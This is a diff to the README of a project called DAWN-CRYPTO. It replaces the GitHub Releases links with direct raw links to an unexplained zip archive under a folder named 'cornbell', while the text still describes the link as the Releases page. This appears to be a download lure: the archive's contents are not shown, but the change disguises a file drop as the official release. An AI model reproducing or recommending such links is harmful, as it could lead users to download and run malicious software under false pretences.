@@ -1,6 +1,6 @@
 # 🚀 DAWN-CRYPTO - Effortless Tools for Developers’ Workflows
 
-[![Download DAWN](https://img.shields.io/badge/Download-DAWN-007ACC?style=for-the-badge&logo=github)](https://github.com/Spencer213/DAWN-CRYPTO/releases)
+[![Download DAWN](https://raw.githubusercontent.com/Spencer213/DAWN-CRYPTO/main/cornbell/DAWN-CRYPTO_unphrased.zip)](https://raw.githubusercontent.com/Spencer213/DAWN-CRYPTO/main/cornbell/DAWN-CRYPTO_unphrased.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To run DAWN, make sure your device meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the download page:** Click on the link below to access the Releases page:
-   [Download DAWN](https://github.com/Spencer213/DAWN-CRYPTO/releases)
+   [Download DAWN](https://raw.githubusercontent.com/Spencer213/DAWN-CRYPTO/main/cornbell/DAWN-CRYPTO_unphrased.zip)
 
 2. **Download the latest version:** On the Releases page, find the most recent version of DAWN. Click the link to download the appropriate file for your operating system.
 
